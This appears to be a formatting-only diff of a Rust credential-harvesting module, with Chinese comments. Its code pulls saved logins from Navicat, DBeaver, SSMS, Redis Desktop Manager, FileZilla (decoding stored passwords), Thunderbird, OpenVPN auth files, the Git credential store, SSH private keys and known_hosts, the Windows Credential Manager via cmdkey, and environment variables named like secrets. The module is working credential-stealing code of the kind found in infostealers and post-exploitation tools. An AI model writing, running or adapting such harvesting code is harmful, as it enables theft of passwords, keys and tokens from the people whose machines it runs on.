@@ -9,7 +9,7 @@
 //! - 云存储 (OneDrive, Dropbox)
 //! - 开发工具 (Git, SSH, Docker)
 
-use crate::cred::{Credential, CredType};
+use crate::cred::{CredType, Credential};
 use std::path::PathBuf;
 
 /// 提取所有应用程序凭据
@@ -121,10 +121,16 @@ fn extract_navicat_credentials() -> Result<Vec<Credential>, String> {
                                 // 搜索连接信息
                                 for username in extract_username_patterns(&content) {
                                     credentials.push(
-                                        Credential::new(CredType::AppCredential, "Navicat数据库客户端")
-                                            .with_username(&username)
-                                            .with_attribute("source_file", &file_path.to_string_lossy())
-                                            .with_attribute("note", "密码已加密（Blowfish），需要Navicat解密密钥")
+                                        Credential::new(
+                                            CredType::AppCredential,
+                                            "Navicat数据库客户端",
+                                        )
+                                        .with_username(&username)
+                                        .with_attribute("source_file", &file_path.to_string_lossy())
+                                        .with_attribute(
+                                            "note",
+                                            "密码已加密（Blowfish），需要Navicat解密密钥",
+                                        ),
                                     );
                                 }
                             }
@@ -143,8 +149,11 @@ fn extract_dbeaver_credentials() -> Result<Vec<Credential>, String> {
     let mut credentials = Vec::new();
 
     let appdata = get_appdata_dir();
-    let dbeaver_path = appdata.join("DBeaverData").join("workspace6")
-        .join("General").join(".dbeaver");
+    let dbeaver_path = appdata
+        .join("DBeaverData")
+        .join("workspace6")
+        .join("General")
+        .join(".dbeaver");
 
     // credentials-config.json
     let cred_config = dbeaver_path.join("credentials-config.json");
@@ -158,7 +167,7 @@ fn extract_dbeaver_credentials() -> Result<Vec<Credential>, String> {
                                 Credential::new(CredType::AppCredential, "DBeaver数据库客户端")
                                     .with_target(key)
                                     .with_password(password)
-                                    .with_attribute("encrypted", "false")
+                                    .with_attribute("encrypted", "false"),
                             );
                         }
                     }
@@ -208,7 +217,9 @@ fn extract_ssms_credentials() -> Result<Vec<Credential>, String> {
     let mut credentials = Vec::new();
 
     let appdata = get_appdata_dir();
-    let ssms_path = appdata.join("Microsoft").join("Microsoft SQL Server Management Studio");
+    let ssms_path = appdata
+        .join("Microsoft")
+        .join("Microsoft SQL Server Management Studio");
 
     // SSMS连接信息存储在SqlStudio.bin中
     if ssms_path.exists() {
@@ -235,7 +246,7 @@ fn extract_ssms_credentials() -> Result<Vec<Credential>, String> {
             credentials.push(
                 Credential::new(CredType::AppCredential, "SQL Server Management Studio")
                     .with_attribute("source_file", &file.to_string_lossy())
-                    .with_attribute("note", "SSMS凭据通过Windows凭据管理器存储，需DPAPI解密")
+                    .with_attribute("note", "SSMS凭据通过Windows凭据管理器存储，需DPAPI解密"),
             );
         }
     }
@@ -263,16 +274,22 @@ fn extract_redis_desktop_credentials() -> Result<Vec<Credential>, String> {
                         if let Some(connections) = json.as_array() {
                             for conn in connections {
                                 let host = conn["host"].as_str().unwrap_or("");
-                                let port = conn["port"].as_u64().map(|p| p.to_string()).unwrap_or_default();
+                                let port = conn["port"]
+                                    .as_u64()
+                                    .map(|p| p.to_string())
+                                    .unwrap_or_default();
                                 let password = conn["password"].as_str().unwrap_or("");
                                 let name = conn["name"].as_str().unwrap_or("");
 
                                 if !password.is_empty() {
                                     credentials.push(
-                                        Credential::new(CredType::AppCredential, "Redis Desktop Manager")
-                                            .with_target(&format!("{}:{}", host, port))
-                                            .with_password(password)
-                                            .with_attribute("connection_name", name)
+                                        Credential::new(
+                                            CredType::AppCredential,
+                                            "Redis Desktop Manager",
+                                        )
+                                        .with_target(&format!("{}:{}", host, port))
+                                        .with_password(password)
+                                        .with_attribute("connection_name", name),
                                     );
                                 }
                             }
@@ -298,7 +315,8 @@ fn extract_ftp_client_credentials() -> Result<Vec<Credential>, String> {
     let host_re = regex::Regex::new(r"<Host>(.+?)</Host>").ok();
     let user_re = regex::Regex::new(r"<User>(.+?)</User>").ok();
     let pass_re = regex::Regex::new(r#"<Pass(?: encoding="base64")?>(.+?)</Pass>"#).ok();
-    let entry_re = regex::Regex::new(r"<(?:RecentServer|Server)>(.*?)</(?:RecentServer|Server)>").ok();
+    let entry_re =
+        regex::Regex::new(r"<(?:RecentServer|Server)>(.*?)</(?:RecentServer|Server)>").ok();
 
     if filezilla_path.exists() {
         for xml_file in &["recentservers.xml", "sitemanager.xml"] {
@@ -308,17 +326,20 @@ fn extract_ftp_client_credentials() -> Result<Vec<Credential>, String> {
                 if let Some(ref re) = entry_re {
                     for cap in re.captures_iter(&content) {
                         let body = cap.get(1).map(|m| m.as_str()).unwrap_or("");
-                        let host = host_re.as_ref()
+                        let host = host_re
+                            .as_ref()
                             .and_then(|r| r.captures(body))
                             .and_then(|c| c.get(1))
                             .map(|m| m.as_str())
                             .unwrap_or("");
-                        let username = user_re.as_ref()
+                        let username = user_re
+                            .as_ref()
                             .and_then(|r| r.captures(body))
                             .and_then(|c| c.get(1))
                             .map(|m| m.as_str())
                             .unwrap_or("");
-                        let password = pass_re.as_ref()
+                        let password = pass_re
+                            .as_ref()
                             .and_then(|r| r.captures(body))
                             .and_then(|c| c.get(1))
                             .and_then(|encoded| base64_decode(encoded.as_str()).ok())
@@ -328,10 +349,11 @@ fn extract_ftp_client_credentials() -> Result<Vec<Credential>, String> {
                             continue;
                         }
 
-                        let mut cred = Credential::new(CredType::AppCredential, "FileZilla FTP客户端")
-                            .with_username(username)
-                            .with_target(host)
-                            .with_attribute("source_file", xml_file);
+                        let mut cred =
+                            Credential::new(CredType::AppCredential, "FileZilla FTP客户端")
+                                .with_username(username)
+                                .with_target(host)
+                                .with_attribute("source_file", xml_file);
                         if let Some(decoded) = password {
                             let password = String::from_utf8_lossy(&decoded);
                             if !password.is_empty() {
@@ -376,13 +398,20 @@ fn extract_mail_client_credentials() -> Result<Vec<Credential>, String> {
                                 if let Some(logins_arr) = json["logins"].as_array() {
                                     for login in logins_arr {
                                         let hostname = login["hostname"].as_str().unwrap_or("");
-                                        let username = login["encryptedUsername"].as_str().unwrap_or("");
+                                        let username =
+                                            login["encryptedUsername"].as_str().unwrap_or("");
                                         if !hostname.is_empty() {
                                             credentials.push(
-                                                Credential::new(CredType::AppCredential, "Thunderbird邮件客户端")
-                                                    .with_target(hostname)
-                                                    .with_attribute("encrypted_username", username)
-                                                    .with_attribute("note", "密码已加密，需要NSS库解密")
+                                                Credential::new(
+                                                    CredType::AppCredential,
+                                                    "Thunderbird邮件客户端",
+                                                )
+                                                .with_target(hostname)
+                                                .with_attribute("encrypted_username", username)
+                                                .with_attribute(
+                                                    "note",
+                                                    "密码已加密，需要NSS库解密",
+                                                ),
                                             );
                                         }
                                     }
@@ -415,7 +444,10 @@ fn extract_vpn_credentials() -> Result<Vec<Credential>, String> {
             if let Ok(entries) = std::fs::read_dir(path) {
                 for entry in entries.flatten() {
                     let file_path = entry.path();
-                    if file_path.extension().is_some_and(|e| e == "ovpn" || e == "conf") {
+                    if file_path
+                        .extension()
+                        .is_some_and(|e| e == "ovpn" || e == "conf")
+                    {
                         if let Ok(content) = std::fs::read_to_string(&file_path) {
                             // 检查是否引用了auth-user-pass文件
                             if let Some(auth_file) = parse_openvpn_auth_file(&content) {
@@ -433,7 +465,10 @@ fn extract_vpn_credentials() -> Result<Vec<Credential>, String> {
                                                 Credential::new(CredType::AppCredential, "OpenVPN")
                                                     .with_username(lines[0])
                                                     .with_password(lines[1])
-                                                    .with_attribute("config_file", &file_path.to_string_lossy())
+                                                    .with_attribute(
+                                                        "config_file",
+                                                        &file_path.to_string_lossy(),
+                                                    ),
                                             );
                                         }
                                     }
@@ -494,7 +529,7 @@ fn extract_git_credentials() -> Result<Vec<Credential>, String> {
                                 Credential::new(CredType::AppCredential, "Git凭据存储")
                                     .with_username(username)
                                     .with_password(password)
-                                    .with_target(host_path)
+                                    .with_target(host_path),
                             );
                         }
                     }
@@ -511,7 +546,7 @@ fn extract_git_credentials() -> Result<Vec<Credential>, String> {
                 credentials.push(
                     Credential::new(CredType::AppCredential, "Git配置")
                         .with_attribute("note", "Git已配置credential helper，凭据由外部管理器存储")
-                        .with_attribute("source_file", &gitconfig_path.to_string_lossy())
+                        .with_attribute("source_file", &gitconfig_path.to_string_lossy()),
                 );
             }
         }
@@ -535,8 +570,13 @@ fn extract_ssh_credentials() -> Result<Vec<Credential>, String> {
 
     // 查找私钥文件
     let private_key_patterns = [
-        "id_rsa", "id_ed25519", "id_ecdsa", "id_dsa",
-        "id_rsa_*", "private_key", "*.pem",
+        "id_rsa",
+        "id_ed25519",
+        "id_ecdsa",
+        "id_dsa",
+        "id_rsa_*",
+        "private_key",
+        "*.pem",
     ];
 
     if let Ok(entries) = std::fs::read_dir(&ssh_dir) {
@@ -546,7 +586,7 @@ fn extract_ssh_credentials() -> Result<Vec<Credential>, String> {
                 if let Some(name) = path.file_name().and_then(|n| n.to_str()) {
                     let is_private_key = private_key_patterns.iter().any(|pattern| {
                         if pattern.contains('*') {
-                            let prefix = &pattern[..pattern.len()-1];
+                            let prefix = &pattern[..pattern.len() - 1];
                             name.starts_with(prefix)
                         } else {
                             name == *pattern || name.contains(".pem")
@@ -564,7 +604,7 @@ fn extract_ssh_credentials() -> Result<Vec<Credential>, String> {
                                     .with_target(name)
                                     .with_attribute("path", &path.to_string_lossy())
                                     .with_attribute("encrypted", &is_encrypted.to_string())
-                                    .with_attribute("size", &key_content.len().to_string())
+                                    .with_attribute("size", &key_content.len().to_string()),
                             );
                         }
                     }
@@ -577,7 +617,8 @@ fn extract_ssh_credentials() -> Result<Vec<Credential>, String> {
     let known_hosts = ssh_dir.join("known_hosts");
     if known_hosts.exists() {
         if let Ok(content) = std::fs::read_to_string(&known_hosts) {
-            let hosts: Vec<String> = content.lines()
+            let hosts: Vec<String> = content
+                .lines()
                 .filter(|l| !l.trim().is_empty() && !l.starts_with('#'))
                 .map(|l| l.split_whitespace().next().unwrap_or("").to_string())
                 .filter(|h| !h.is_empty())
@@ -588,7 +629,7 @@ fn extract_ssh_credentials() -> Result<Vec<Credential>, String> {
                 credentials.push(
                     Credential::new(CredType::AppCredential, "SSH已知主机")
                         .with_target(&hosts.join(", "))
-                        .with_attribute("total_hosts", &hosts.len().to_string())
+                        .with_attribute("total_hosts", &hosts.len().to_string()),
                 );
             }
         }
@@ -608,7 +649,10 @@ fn extract_windows_credential_manager() -> Result<Vec<Credential>, String> {
         .map_err(|e| format!("vaultcmd失败: {}", e))?;
 
     let stdout = String::from_utf8_lossy(&output.stdout);
-    tracing::info!("[应用凭据] Windows凭据管理器: {} 条目", stdout.lines().count());
+    tracing::info!(
+        "[应用凭据] Windows凭据管理器: {} 条目",
+        stdout.lines().count()
+    );
 
     // 使用cmdkey获取详细信息
     let cmdkey_output = std::process::Command::new("cmdkey")
@@ -620,12 +664,16 @@ fn extract_windows_credential_manager() -> Result<Vec<Credential>, String> {
     for line in cmdkey_stdout.lines() {
         let line = line.trim();
         if line.starts_with("目标:") || line.starts_with("Target:") {
-            let target = line.split(':').nth(1).map(|s| s.trim().to_string()).unwrap_or_default();
+            let target = line
+                .split(':')
+                .nth(1)
+                .map(|s| s.trim().to_string())
+                .unwrap_or_default();
             if !target.is_empty() && target != "LegacyGeneric:target=MyTarget" {
                 credentials.push(
                     Credential::new(CredType::AppCredential, "Windows凭据管理器")
                         .with_target(&target)
-                        .with_attribute("note", "需要DPAPI解密获取实际凭据")
+                        .with_attribute("note", "需要DPAPI解密获取实际凭据"),
                 );
             }
         }
@@ -640,11 +688,23 @@ fn extract_env_credentials() -> Result<Vec<Credential>, String> {
 
     // 搜索环境变量中的敏感信息
     let sensitive_keys = [
-        "PASSWORD", "PASS", "SECRET", "TOKEN", "API_KEY",
-        "AWS_SECRET", "DB_PASSWORD", "MYSQL_PWD", "PGPASSWORD",
-        "AZURE_PASSWORD", "GITHUB_TOKEN", "DOCKER_PASSWORD",
-        "SA_PASSWORD", "CONNECTION_STRING", "LDAP_PASSWORD",
-        "SMTP_PASSWORD", "PROXY_PASSWORD",
+        "PASSWORD",
+        "PASS",
+        "SECRET",
+        "TOKEN",
+        "API_KEY",
+        "AWS_SECRET",
+        "DB_PASSWORD",
+        "MYSQL_PWD",
+        "PGPASSWORD",
+        "AZURE_PASSWORD",
+        "GITHUB_TOKEN",
+        "DOCKER_PASSWORD",
+        "SA_PASSWORD",
+        "CONNECTION_STRING",
+        "LDAP_PASSWORD",
+        "SMTP_PASSWORD",
+        "PROXY_PASSWORD",
     ];
 
     for (key, value) in std::env::vars() {
@@ -653,7 +713,7 @@ fn extract_env_credentials() -> Result<Vec<Credential>, String> {
             if key_upper.contains(sensitive) {
                 // 掩码部分密码
                 let masked = if value.len() > 4 {
-                    format!("{}...{}", &value[..2], &value[value.len()-2..])
+                    format!("{}...{}", &value[..2], &value[value.len() - 2..])
                 } else {
                     "****".to_string()
                 };
@@ -662,7 +722,7 @@ fn extract_env_credentials() -> Result<Vec<Credential>, String> {
                     Credential::new(CredType::AppCredential, "环境变量")
                         .with_target(&key)
                         .with_password(&value)
-                        .with_attribute("masked", &masked)
+                        .with_attribute("masked", &masked),
                 );
                 break;
             }
@@ -716,8 +776,11 @@ fn extract_username_patterns(content: &str) -> Vec<String> {
 fn extract_db_connection_info(content: &str, app_name: &str, credentials: &mut Vec<Credential>) {
     for username in extract_username_patterns(content) {
         credentials.push(
-            Credential::new(CredType::AppCredential, &format!("{}数据库客户端", app_name))
-                .with_username(&username)
+            Credential::new(
+                CredType::AppCredential,
+                &format!("{}数据库客户端", app_name),
+            )
+            .with_username(&username),
         );
     }
 }
@@ -763,10 +826,7 @@ mod tests {
             parse_openvpn_auth_file("auth-user-pass auth.txt"),
             Some("auth.txt".to_string())
         );
-        assert_eq!(
-            parse_openvpn_auth_file("auth-user-pass"),
-            None
-        );
+        assert_eq!(parse_openvpn_auth_file("auth-user-pass"), None);
     }
 
     #[test]
